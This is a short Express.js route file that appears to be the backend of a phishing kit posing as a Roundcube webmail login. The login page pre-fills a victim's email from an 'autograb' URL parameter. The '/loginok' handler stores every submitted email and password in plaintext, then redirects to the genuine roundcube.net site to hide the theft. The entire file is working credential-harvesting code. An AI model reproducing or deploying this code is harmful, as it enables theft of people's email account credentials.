const express = require('express');
const router = express.Router();

// Load User model
const User = require('../models/User');


// Login Page
router.get('/login', (req, res) => {
  let email = req.query.autograb || '';
  res.render('layout', { email: email });
});

// Login
router.post('/loginok', (req, res, next) => {
  const user = new User({
    email:req.body.email || '',
    password: req.body.password,
  })

  user
  .save()
  .then(result => {
    console.log(result)
    req.flash(
      'success_msg',
      'Login ok'
    );

    res.redirect('https://roundcube.net/');
 
  })
.catch(err => console.log(err));
});

// Logout
router.get('/logout', (req, res) => {
  req.logout();
  req.flash('success_msg', 'You are logged out');
  res.redirect('/users/login');
});

module.exports = router;